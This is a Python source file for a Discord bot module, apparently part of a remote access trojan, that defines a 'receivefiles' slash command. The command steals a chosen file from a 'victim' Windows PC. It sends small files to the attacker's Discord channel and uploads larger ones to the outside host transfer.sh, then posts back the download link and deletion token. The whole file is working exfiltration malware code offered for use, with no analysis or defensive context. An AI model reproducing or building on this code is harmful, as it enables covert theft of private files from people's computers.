import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class ReceiveFiles(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command( )
    async def receivefiles(self, ctx, victim, file_path):
        """Receives file from victim's PC.

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file_path: Path of the file for receiving.
        """
        if str(victim) != str(self.bot.identifier):
            return
        await ctx.response.defer()

        if '"' in file_path:
            file_path = file_path.replace('"','')
        try: 
            f = open(file_path, "rb")
        except: 
            return await ctx.followup.send(
                embed=self.bot.genEmbed(
                    "File was not found!", 
                    datetime.now(), 
                    "Please specify a different path and try again"
                )
            )

        if os.path.getsize(file_path) < 8388608:
            return await ctx.followup.send(
                embed = self.bot.genEmbed(
                    "Received file from victim",
                    datetime.now()
                ),
                file = discord.File(
                    file_path
                )
            )

        file = {f'{file_path}': f}
        response = requests.post('https://transfer.sh/', files=file)
        download_link = response.content.decode('utf-8')
        deletion_token = response.headers.get("X-Url-Delete")

        deletion_token = deletion_token.replace(f'{download_link.rstrip()}/', '')

        await ctx.followup.send(
            embed=self.bot.genEmbed(
                "Received file from victim",
                datetime.now(),
                "Link:\n" + download_link + "\nDeletion token:\n" + deletion_token
            )
        )
            
def setup(bot: commands.Bot):
    bot.add_cog(ReceiveFiles(bot))